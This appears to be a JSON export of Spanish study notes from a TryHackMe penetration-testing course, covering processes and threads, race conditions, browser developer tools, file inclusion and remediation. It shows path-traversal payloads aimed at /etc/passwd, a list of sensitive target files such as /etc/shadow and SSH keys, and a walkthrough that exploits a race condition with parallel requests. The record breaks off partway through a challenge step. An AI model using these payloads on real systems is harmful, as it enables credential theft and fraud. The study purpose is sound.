    "content": "En esta tarea veremos los siguientes t√©rminos:\n\n- Programa\n- Proceso\n- Hilo\n- Multi-hilos\n\n---------------------------\n<h2>Programa</h2>\nUn programa es un conjunto de instrucciones para conseguir una tarea espec√≠fica. Necesitas ejecutar un programa para conseguir lo que deseas. Si no lo ejecutas, este no hace nada y se mantiene como un conjunto de instrucciones est√°ticas.\n\nPi√©nsalo como una receta:\n\n```markdown\n1. Combine brewed coffee, cardamom, cinnamon, and cloves (if using) in a saucepan.\n2. Heat the mixture over low heat for 5 minutes, stirring occasionally. Do not boil.\n3. Strain the coffee into your mug.\n4. Add milk if desired, and sweeten to taste with honey or sugar.\n```\n\nA no ser que alguien lleva a cabo la receta, no habr√° caf√©.\n\nVeamos el paralelismo con un servidor en Python que diga \"Hello World\". El c√≥digo de abajo dicta que la app escuchar√° en el puerto 8080 y responder√° con un saludo m√≠nimo en HTML. Sin embargo, debemos ejecutar este programa antes de esperar ninguna p√°gina en la conexi√≥n.\n\n```python\n# Import the Flask class from the flask module\nfrom flask import Flask\n\n# Create an instance of the Flask class representing the application\napp = Flask(__name__)\n\n# Define a route for the root URL ('/')\n@app.route('/')\ndef hello_world():\n    # This function will be executed when the root URL is accessed\n    # It returns a string containing HTML code for a simple web page\n    return '<html><head><title>Greeting</title></head><body><h1>Hello, World!</h1></body></html>'\n\n# This checks if the script is being run directly (as the main program)\n# and not being imported as a module\nif __name__ == '__main__':\n    # Run the Flask application\n    # The host='0.0.0.0' allows the server to be accessible from any IP address\n    # The port=8080 specifies the port number on which the server will listen\n    app.run(host='0.0.0.0', port=8080)\n```\n\n-----------------------------------------\n<h2>Procesos</h2>\nUna tarde decides probar a hacer una nueva receta de caf√©. Empiezas a realizar los pasos uno a uno. Est√°s en el proceso de hacer un caf√©. Mientras realizas este proceso puedes ser interrumpido por una llamada urgente. O puede que hagas otra tarea mientras esperas a que el agua hierva. Las interrupciones y las esperas son generalmente inevitables.\n\nUn proceso es un programa en ejecuci√≥n. Tambi√©n llamado trabajo (job). Al contrario que un programa, el cual es est√°tico, un proceso es una entidad din√°mica. Recoge varios aspectos clave, en particular:\n\n- **Programa:** El c√≥digo ejecutable relacionado con el proceso.\n- **Memoria:** El almacenamiento temporal de informaci√≥n.\n- **Estado:** Un proceso suele saltar entre diferentes estados. Despu√©s del estado \"Nuevo\" salta al estado \"Listo\", para luego ir al estado \"Corriendo\". Puede estar en estados \"Esperando\" o \"Pendiente\" o \"Completado\", etc.\n  ![[Pasted image 20251110205010.png]]\n\n Si ejecutas el c√≥digo de antes, se crear√° un proceso que escuchar√° conexiones entrantes en el puerto 8080. Es decir se crear√° un proceso en estado \"Esperando\". Cuando reciba una petici√≥n `GET / HTTP`, cambiar√° a estado \"Listo\" en espera a que la CPU le de el turno de correr. Una vez en estado \"Corriendo\", mandar√° la p√°gina HTML al cliente que la solicit√≥ y volver√° al estado \"Esperando\".\n \n```shell\n$ flask run --without-threads --host=0.0.0.0  \n\t* Debug mode: off \nWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.  \n\t* Running on all addresses (0.0.0.0)  \n\t* Running on http://127.0.0.1:5000  \n\t* Running on http://192.168.0.104:5000 \nPress CTRL+C to quit \n127.0.0.1 - - [16/Apr/2024 23:34:46] \"GET / HTTP/1.1\" 200 - \n127.0.0.1 - - [16/Apr/2024 23:34:48] \"GET / HTTP/1.1\" 200 - \n127.0.0.1 - - [16/Apr/2024 23:35:11] \"GET / HTTP/1.1\" 200 -\n```\n\n----------------------------------------\n<h2>Hilos</h2>\nTerminemos con otra analog√≠a de caf√©. Considera el caso de una m√°quina comercial de espresso en una cafeter√≠a. Digamos que tiene dos portafiltros. AL inicio de la jornada enciendes la m√°quina y cuando un cliente te pide un espresso, usas un portafiltros para prepararlo. Si otro cliente te pide otro a la vez, no hay problema, para eso tienes dos.\n\nUn hilo es una unidad de ejecuci√≥n ligera. Comparte varias partes de memoria e instrucciones con el proceso. En varios casos, necesitamos replicar el mismo proceso repetidamente. Para ello podemos adoptar dos acercamientos:\n\n- **Serial:** Un proceso est√° corriendo y corre el otro proceso de manera secuencial. Los nuevos procesos son puestos en cola.\n- **Paralelo:** Un proceso est√° corriendo y crea un nuevo hilo para servir al nuevo proceso. Los procesos nuevos s√≥lo se ponen en cola cuando se ah alcanzado el m√°ximo de hilos simult√°neos corriendo.\n\nLa aplicaci√≥n anterior puede correr usando cuatro hilos usando Gunicorn, tambi√©n llamado \"Green Unicorn\", que es un servidor **Python WSGI HTTP**. WSGI significa Web Server Gateway Interface, el cual comunica los servidores webs y aplicaciones web Python.\n\n```shell\ngunicorn --workers=4 --threads=2 -b 0.0.0.0:8080 app:app\n[2024-04-16 23:35:59 +0300] [507149] [INFO] Starting gunicorn 21.2.0\n[2024-04-16 23:35:59 +0300] [507149] [INFO] Listening at: http://0.0.0.0:8080 (507149)\n[2024-04-16 23:35:59 +0300] [507149] [INFO] Using worker: gthread\n[2024-04-16 23:35:59 +0300] [507150] [INFO] Booting worker with pid: 507150\n[2024-04-16 23:35:59 +0300] [507151] [INFO] Booting worker with pid: 507151\n[2024-04-16 23:35:59 +0300] [507152] [INFO] Booting worker with pid: 507152\n[2024-04-16 23:35:59 +0300] [507153] [INFO] Booting worker with pid: 507153\n```\n\n>[!IMPORTANT] Es imposible correr m√°s de una copia de este proceso a la vez ya que se relaciona con el puerto 8080. Cada puerto s√≥lo puede tener ligado un proceso.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Race Conditions",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/9-race-conditions/0-race-conditions/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/9. Race Conditions/0. Race Conditions.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 9. Race Conditions",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/9. Race Conditions/1. Introduction]]\n[[2. Multi-Threading]]\n[[3. Race Conditions]]\n[[4. Web Application Architecture]]\n[[5. Exploiting Race Conditions]]\n[[6. Detection and Mitigation]]\n[[7. Challenge Web App]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Challenge Web App",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/9-race-conditions/7-challenge-web-app/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/9. Race Conditions/7. Challenge Web App.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 9. Race Conditions",
    "content": "Siguiendo todo lo que has aprendido, es hora de intentar descubrir y explotar una race condition sin gu√≠a.\n\nEstas son las credenciales que necesitar√°s:\n\n**Name: Rasser Cond**\n\n- Username: `4621`\n- Password: `blueApple`\n\n**Name: Zavodni Stav**\n\n- Username: `6282`\n- Password: `whiteHorse`\n\n**Name: Warunki Wyscigu**\n\n- Username: `9317`\n- Password: `greenOrange`\n\n¬°A por ello!\n\n-----------------------------\n<h2>Challenge</h2>\n1. Vamos a la p√°gina dada.\n   ![[Pasted image 20251112190549.png]]\n2. Iniciamos sesi√≥n con los tres usuarios para ver qu√© tiene cada uno:\n\t1. 4621:\n\t   ![[Pasted image 20251112190710.png]]\n\t2. 6282:\n\t   ![[Pasted image 20251112190754.png]]\n\t3. 9317:\n\t   ![[Pasted image 20251112190828.png]]\n\t   \n\t   Vemos que todos tienen lo mismo y adem√°s se tienen a√±adidos en transferencias favoritas. Como tenemos que conseguir un balance superior a 1000$ en una cuenta vamos a pasarnos de la primera a la segunda, por ejemplo.\n\t   \n3. Entramos de nuevo en la primera cuenta, pero ahora desde el navegador de Burp Suite y hacemos click en la persona a la que le vamos a enviar el dinero.\n   ![[Pasted image 20251112191342.png]]\n4. Cargamos el dinero que queremos mandar y ponemos Burp Suite en intercepci√≥n.\n   ![[Pasted image 20251112202737.png]]\n5. Vemos que ha sido exitosa.\n   ![[Pasted image 20251112202756.png]]\n6. Vamos a probar ahora a mandar una cantidad superior. Para ello modificamos los n√∫meros y duplicamos las pesta√±as. Las mandaremos en paralelo.\n   ![[Pasted image 20251112203113.png]]\n7. Parece ser que \"gunicorn\" no est√° configurado para soportar 20 duplicados. Probaremos con 10.\n   ![[Pasted image 20251112203715.png]]\n8. A√∫n as√≠ ha llegado cierta cantidad:\n   ![[Pasted image 20251112204018.png]]\n9. Como parece que hay l√≠mite, vamos a enviar ahora dinero desde la 2¬™ a la 3¬™ cuenta.\n   ![[Pasted image 20251112204600.png]]\n10. En el repetidor llevamos a cabo el mismo proceso.\n    ![[Pasted image 20251112204812.png]]\n11. Parece que no ha podido manejarlo, como antes, sin embargo:\n    ![[Pasted image 20251112204841.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Developer Tools - Inspector",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/1-walking-an-application/4-developer-tools-inspector/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/1. Walking an Application/4. Developer Tools - Inspector.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 1. Walking an Application",
    "content": "<h2>Herramientas de Desarrollador</h2>\nTodos los navegadores modernos cuentan con herramientas de desarrollador. Es un kit de ayuda usado por desarrolladores web para depurar aplicaciones web. Como pentester, podemos usar estas herramientas para ganar conocimiento sobre el funcionamiento de la aplicaci√≥n. Nos centraremos en tres componentes: Inspector, Debugger y Network.\n\n-------------------------------\n<h2>Abrir las Herramientas de Desarrollador</h2>\nPuedes hacerlo pulsando `F12` o click derecho/men√∫ e inspeccionar elemento/herramientas de desarrollador.\n\n--------------------------------\n<h2>Inspector</h2>\nEl c√≥digo fuente no siempre representa lo que se ve en la p√°gina web porque CSS, JS y la interacci√≥n del usuario pueden cambiar el contenido y el estilo de la p√°gina.\n\nAdem√°s podemos modificar el c√≥digo para interactuar con las p√°ginas. En la p√°gina de `/news` de Acme podemos ver que hay tres art√≠culos. Los dos primeros son legibles pero el tercero est√° bloqueado:\n\n![[Pasted image 20251103123823.png]]\n\nSi inspeccionamos el elemento de la notificaci√≥n premium, podemos seleccionar opciones del men√∫ y cambiar c√≥digo por ejemplo cambiando el CSS de `block` a `none`.\n\n![[Pasted image 20251103124138.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Developer Tools - Debugger",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/1-walking-an-application/5-developer-tools-debugger/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/1. Walking an Application/5. Developer Tools - Debugger.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 1. Walking an Application",
    "content": "Este panel est√° orientado a debuggear (depurar) JavaScript. Como pentesters nos da la opci√≥n de rebuscar profundo en el c√≥digo JavaScript. En Firefox y Safari se llama **Debugger** y en Google Chrome **Sources**.\n\nEn la p√°gina web de Acme haz click en la p√°gina de `/contact`. Cada vez que se carga la p√°gina puedes notar un flash de rojo r√°pido en la pantalla. Vamos a usar el debugger para ver qu√© es esto.\n\nEn la parte de la izquierda ver√°s una lista de todos los recursos de la p√°gina actual. Si le das click a `assets` ver√°s un archivo llamado `flash.min.js`.\n\nMuchas veces, al ver archivos javascript te dar√°s cuenta de que todo est√° en un l√≠nea, que pasa porque ha sido minimizado, que implica que se elimina todo el formato. Este archivo no es una excepci√≥n y adem√°s tambi√©n ha sido ofuscado.\n\nPodemos recuperar algo de formato haciendo click derecho sobre la pesta√±a del c√≥digo y usando la funcionalidad `pretty print`. Al final del achivo vemos la linea: `flash['remove']();`\n\n![[Pasted image 20251103130038.png]]\n\nPodemos usar breakpoints, que son puntos donde el navegador fuerza la detenci√≥n de la ejecuci√≥n. Si hacemos click en la l√≠nea de remove veremos que se pone azul y se a√±ade al apartado breakpoints. Ahora refrescamos la p√°gina.\n\n![[Pasted image 20251103130228.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Walking an Application",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/1-walking-an-application/0-walking-an-application/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/1. Walking an Application/0. Walking an Application.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 1. Walking an Application",
    "content": "[[1. Walking An Application]]\n[[2. Exploring the Website]]\n[[3. Viewing The Page Source]]\n[[4. Developer Tools - Inspector]]\n[[5. Developer Tools - Debugger]]\n[[6. Developer Tools - Network]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Viewing The Page Source",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/1-walking-an-application/3-viewing-the-page-source/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/1. Walking an Application/3. Viewing The Page Source.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 1. Walking an Application",
    "content": "La fuente web es el c√≥digo legible por humanos devuelto al navegador cada vez que hacemos una petici√≥n.\n\nEl c√≥digo devuelto est√° hecho de HTML, CSS y JavaScript y es lo que le dice al navegador qu√© contenido mostrar, c√≥mo mostrarlo y a√±ade elementos de interacci√≥n.\n\n------------------------------\n<h2>¬øC√≥mo vemos el c√≥digo fuente?</h2>\n1. Al ver una p√°gina web podemos hacer click derecho en la p√°gina y veremos una opci√≥n que dice ver c√≥digo fuente.\n2. La mayor√≠a de lso navegadores soportan el m√©todo **view-sorce** enn frente de la URL, por ejemplo: \"view-source:https://www.google.com\".\n3. En el men√∫ del buscador encontrar√°s una opci√≥n para ver el c√≥digo fuente. A veces puede estar en submen√∫s como en opciones de desarrollador.\n\n---------------------------------\n<h2>¬°Veamos un c√≥digo fuente!</h2>\nIntenta ver el c√≥digo de la p√°gina de soporte IT de Acme. Arriba de la p√°gina notar√°s texto rodeado por `<!--` y `-->`. Esto son comentarios. Los hiper v√≠nculos empiezan con `<a` y dentro tienen el atributo `href`.\n\n![[Pasted image 20251103114500.png]]\n\nSi seguimos leyendo vemos una p√°gina `/secrets` que nos lleva a una flag:\n\n![[Pasted image 20251103115256.png]]\n\nSi seguimos mirando m√°s en profundidad podemos ver desde d√≥nde est√°n cargando las im√°genes:\n\n![[Pasted image 20251103115715.png]]\n\nSi miramos en ese directorio, deber√≠amos obtener un 403 - Forbbiden o alg√∫n error de ese estilo, sin embargo la opci√≥n de listado est√° habilitada:\n\n![[Pasted image 20251103115804.png]]\n\nMuchas veces esto puede no ser un problema, pero en este caso vemos que hay un flag.txt.\n\nLa mayor√≠a de los desarrolladores no empiezan el desarrollo web desde 0, sino que usan frameworks para acelerar sus desarrollos permiti√©ndoles meter funcionalidades que tienen la mayor√≠a de webs con un simple enlace, como el manejo de usuarios. A veces conocer el framework y su versi√≥n es una poderosa herramienta de explotaci√≥n:\n\n![[Pasted image 20251103120300.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Developer Tools - Network",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/1-walking-an-application/6-developer-tools-network/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/1. Walking an Application/6. Developer Tools - Network.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 1. Walking an Application",
    "content": "La pesta√±a de red en las herramientas de desarrollador puede usarse para llevar una cuenta de cada petici√≥n externa que hace la p√°gina.\n\nPrueba a hacer esto en la p√°gina de `/contact`. Puedes borrar la lista con el bot√≥n de la basura, por si se sobrepobla.\n\nCon la pesta√±a de red abierta, prueba a rellenar la informaci√≥n de contacto y presionar **Send Message**. Notar√°s un evento, esto es la solicitud siendo subida usando un m√©todo llamado AJAX. AJAX es un m√©todo para mandar y recibir informaci√≥n por red en una aplicaci√≥n web sin interferir cambiando la web actual.\n\n![[Pasted image 20251103160504.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Exploring the Website",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/1-walking-an-application/2-exploring-the-website/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/1. Walking an Application/2. Exploring the Website.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 1. Walking an Application",
    "content": "Tu rol, como pentester, es revisar una p√°gina o aplicaci√≥n web para descubrir sus cualidades que potencialmente podr√≠an ser vulnerables e intentar explotarlas para evaluar si lo son o no. Estas partes suelen ser partes de interacci√≥n con el usuario.\n\nPara encontrar esas partes interactivas basta con navegar la p√°gina y buscarlas como en formularios login o cajas de b√∫squeda.\n\nUna revisi√≥n de esto para la p√°gina de Soporte IT de Acme, la p√°gina de la m√°quina, se ver√≠a as√≠:\n\n| **Funcionalidad**       | **URL**               | **Resumen**                                                                             |\n| ----------------------- | --------------------- | --------------------------------------------------------------------------------------- |\n| Home Page               | /                     | Contiene un resumen de lo que Acme IT Support hace con fotos de su compa√±√≠a y equipo.   |\n| Latest News             | /news                 | Contiene una lista de art√≠culos recientemente publicados, cada uno con un ID diferente. |\n| News Article            | /news/article?id=1    | Muestra el art√≠culo individual. Algunos parecen estar bloqueados para usuarios premium. |\n| Contact Page            | /contact              | Contiene un formulario para que los clientes contacten a la empresa.                    |\n| Customers               | /customers            | Redirige a `/customers/login`.                                                          |\n| Customer Login          | /customers/login      | Contiene un formulario para iniciar sesi√≥n.                                             |\n| Customer Signup         | /customers/signup     | Contiene un formulario de registro.                                                     |\n| Customer Reset Password | /customers/reset      | Formulario de reseteo de contrase√±a.                                                    |\n| Customer Dashboard      | /customers            | Contiene una lista de los tickets subidos y un bot√≥n para crear tickets.                |\n| Create Ticket           | /customers/ticket/new | Contiene un formulario para introducir el problema y subir archivos.                    |\n| Customer Account        | /customers/account    | Permite a los usuarios cambiar su nombre, correo y contrase√±a.                          |\n| Customer Logout         | /customers/logout     | Cierra la sesi√≥n del usuario.                                                           |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Walking An Application",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/1-walking-an-application/1-walking-an-application/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/1. Walking an Application/1. Walking An Application.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 1. Walking an Application",
    "content": "En esta unidad aprenderemos como revisar una aplicaci√≥n web buscando problemas de seguridad usando s√≥lo herramientas incrustadas en el navegador.\n\nAqu√≠ una lista de las herramientas que veremos:\n\n- **View Source:** Para poder ver el c√≥digo fuente de una p√°gina web.\n- **Inspector:** Para inspeccionar elementos de una p√°gina web.\n- **Debugger:** Inspecciona y controla el flujo del JavaScript de una p√°gina.\n- **Network:** Para ver todas las peticiones web que hace la p√°gina.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Remediation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/6-file-inclusion/6-remediation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/6. File Inclusion/6. Remediation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 6. File Inclusion",
    "content": "Como desarrollador, es importante estar al tanto de las vulnerabilidades de aplicaciones web, c√≥mo encontrarlas y los m√©todos de prevenci√≥n. Para prevenir las vulnerabilidades de inclusi√≥n de archivos sigue las siguientes recomendaciones:\n\n1. Mant√©n sistemas y servicios, incluyendo frameworks de aplicaciones web, actualizados a la √∫ltima versi√≥n.\n2. Apaga los errores PHP para evitar la ruta de la aplicaci√≥n y otra informaci√≥n reveladora.\n3. Un Firewall de Aplicaci√≥n Web (WAF) es una buena opci√≥n para ayudar a mitigar los ataques de aplicaciones web.\n4. Deshabilita algunas funcionalidades PHP que causan vulnerabilidades de inclusi√≥n de archivos si tu aplicaci√≥n web no los necesita, como `allow_url_fopen` y `allow_url_include`.\n5. Analiza tu aplicaci√≥n web concienzudamente y permite s√≥lo protocolos y wrappers PHP que se necesiten.\n6. Nunca conf√≠es en el input del usuario e implementa validaci√≥n de input correcta.\n7. Implementa una lista blanca para nombres de archivos y rutas permitidas, as√≠ como una lista negra.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/6-file-inclusion/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/6. File Inclusion/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 6. File Inclusion",
    "content": "<h2>¬øQu√© es File Inclusion (Inclusi√≥n de Archivos)?</h2>\nEsta unidad apunta a equiparte con los conocimientos esenciales para explotar las vulnerabilidades de inclusi√≥n de archivos, incluyendo LFI, RFI y Directory Traversal. Adema√°s, veremos los riesgos de estas vulnerabilidades y c√≥mo remediarlas.\n\nEn algunos casos, las aplicaciones web se escriben para pedir acceso a archivos nen ciertos sistemas, incluir im√°genes, texto est√°tico y m√°s v√≠a par√°metros. Los par√°metros son strings query a√±adidas a la URL y sirven para recuberar informaci√≥n o realizar acciones.\n\n![[Pasted image 20251104144444.png]]\n\nPor ejemplo, Google usa par√°metros para buscar lo introducido por el usuario: `https://www.google.com/search?q=TryHackMe`. Por ejemplo, si un usuario quiere mostrar su CV en la p√°gina web, la petici√≥n puede verse algo como: `http://webapp.thm/get.php?file=userCV.pdf`, donde file es el par√°metro y userCV.pdf el archivo.\n\n![[Pasted image 20251104144703.png]]\n\n---------------------------------\n<h2>¬øPor qu√© ocurren las vulnerabilidades de File Inclusion?</h2>\nSe encuentran com√∫nmente en varios lenguajes de programaci√≥n de aplicaciones web, como PHP. EL principal problema es la validaci√≥n del input, en el que el input del usuario no est√° correctamente validado y sanitizado.\n\n--------------------------------------\n<h2>¬øCu√°l es el riesgo del File Inclusion?</h2>\nUn atacante podr√≠a exfiltrar informaci√≥n e incluso ganar acceso (RCE).",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. File Inclusion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/6-file-inclusion/0-file-inclusion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/6. File Inclusion/0. File Inclusion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 6. File Inclusion",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/6. File Inclusion/1. Introduction]]\n[[2. Path Traversal]]\n[[3. Local File Inclusion - LFI]]\n[[4. Local File Inclusion - LFI Continued]]\n[[5. Remote File Inclusion - RFI]]\n[[6. Remediation]]\n[[7. Challenge]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Path Traversal",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/6-file-inclusion/2-path-traversal/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/6. File Inclusion/2. Path Traversal.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 6. File Inclusion",
    "content": "Tambi√©n conocido como `Directory Traversal`, es una vulnerabilidad web que permite a un atacante leer recursos del sistema operativo, como archivos locales en el servidor que corre la aplicaci√≥n. El atacante explota esta vulnerabilidad manipulando la URL de la aplicaci√≥n web para acceder a archivos o directorios almacenados fuera del directorio de la aplicaci√≥n.\n\nLas vulnerabilidades de path traversal ocurren cuando el input de un usuario se pasa a una funci√≥n como `file_get_contents` en PHP. Es importante darse cuenta de que la funci√≥n no es el contribuidor principal de la vulnerabilidad. Normalmente lo es la pobre validaci√≥n o filtro del input del usuario. Puedes encontrar m√°s informaci√≥n sobre la funci√≥n de PHP de la que hemos hablado y de m√°s [aqu√≠](https://www.php.net/manual/en/function.file-get-contents.php).\n\nEl siguiente gr√°fico muestra c√≥mo una aplicaci√≥n web guarda archivos en `/var/www/app`. El camino pretendido es extraer el pdf, sin embargo:\n\n![[Pasted image 20251105001355.png]]\n\nPodemos comprobar nuestro par√°metro URL a√±adiendo payloads para ver c√≥mo se comporta la aplicaci√≥n. Los ataques de path traversal, tambi√©n conocidos como ataques `dot-dot-slash`, se aprovechan de mover el directorio hacia arriba usando dobles puntos (`../`). Si el atacante encuentra un punto de entrada, entonces puede mandar algo como: `http://webapp.thm/get.php?file=../../../../../../../../../etc/passwd`. Si no hay validaci√≥n de entrada, cada doble punto barra mueve el directorio un nivel hacia arriba, llegando a `/` y pudiendo leer `/etc/passwd`.\n\n![[Pasted image 20251105002134.png]]\n\nComo resultado, el servidor manda de vuelta el contenido del archivo:\n\n![[Pasted image 20251105002156.png]]\n\nSi el servidor corre en Windows, puede hacer algo similar:\n\n- `http://webapp.thm/get.php?file=../../../../boot.ini`\n- `http://webapp.thm/get.php?file=../../../../windows/win.ini`\n\nAbajo unos archivos que te podr√≠an interesar en el testeo:\n\n| **Ruta**                      | **Descripci√≥n**                                                                                              |\n| ----------------------------- | ------------------------------------------------------------------------------------------------------------ |\n| `/etc/issue`                  | Contiene un mensaje o identificaci√≥n de sistema para ser printeada antes del prompt de login.                |\n| `/etc/profile`                | Controla variables de entorno a nivel de sistema como Export, File creation, Terminal type, Mail messages... |\n| `/proc/version`               | Especifica la versi√≥n del kernel de Linux.                                                                   |\n| `etc/passwd`                  | Tiene todos los usuarios registrados que tienen acceso al sistema.                                           |\n| `/etc/shadow`                 | Contiene informaci√≥n sobre las contrase√±as de los usuarios del sistema.                                      |\n| `/root/.bash_history`         | Contiene el historial de comandos del usuario `root`.                                                        |\n| `/var/log/dmessage`           | Contiene los mensajes globales de sistema, incluyendo los que se registran durante el arranque.              |\n| `/var/mail/root`              | Todos los emails para el usuario `root`.                                                                     |\n| `/root/.ssh/id_rsa`           | Claves SSH privadas para root o cualquier usuario v√°lido del servidor.                                       |\n| `/var/log/apache2/access.log` | Las peticiones hechas al servidor apache.                                                                    |\n| `C:\\boot.ini`                 | Opciones de arranque para ordenadores con BIOS.                                                              |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Challenge",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/6-file-inclusion/7-challenge/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/6. File Inclusion/7. Challenge.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 6. File Inclusion",
    "content": "<h2>Pasos para encontrar una LFI</h2>\n1. Encuentra un punto de entrada que podr√≠a ser v√≠a `GET`, `POST`, `COOKIE` o `HTTP`.\n2. Mete un input v√°lido para ver c√≥mo se comporta el servidor.\n3. Mete inputs inv√°lidos para ver c√≥mo es el manejo de errores.\n4. No siempre de f√≠es de los formularios. Puedes usar una herramienta como Burp Suite para ver qu√© pasa por detr√°s.\n5. Busca errores para encontrar la ruta de la aplicaci√≥n. Si no hay errores, puede que tu mejor opci√≥n sea prueba y error.\n6. Entiende la validaci√≥n de input y si hay filtros.\n7. Prueba a inyectar una entrada v√°lida para leer archivos sensibles.\n\n-------------------------------\n<h2>#1</h2>\nDebes capturar la flag en `/etc/flag1`.\n\n1. Vamos a la p√°gina dada.\n   ![[Pasted image 20251106131837.png]]\n2. El input `welcome.php` no hace nada.\n   ![[Pasted image 20251106132046.png]]\n3. Mandamos `POST welcome.php` pero no pasa nada asique vamos a ver qu√© est√° pasando en burpsuite.\n   ![[Pasted image 20251106132202.png]]\n4. Volvemos a probar pero ahora con `intercept on` en Burp Suite.\n   ![[Pasted image 20251106132323.png]]\n5. En Burp Suite vemos que se est√° enviando por `GET` y que no pasa nada, vamos a cambiar el m√©todo de env√≠o:\n   ![[Pasted image 20251106132504.png]]\n   ![[Pasted image 20251106132605.png]]\n6. Vemos que en la respuesta se ha cargado el contenido de `welcome.php`:\n   ![[Pasted image 20251106132743.png]]\n7. Vamos a probar a cargar el contenido de `/etc/flag1`:\n   ![[Pasted image 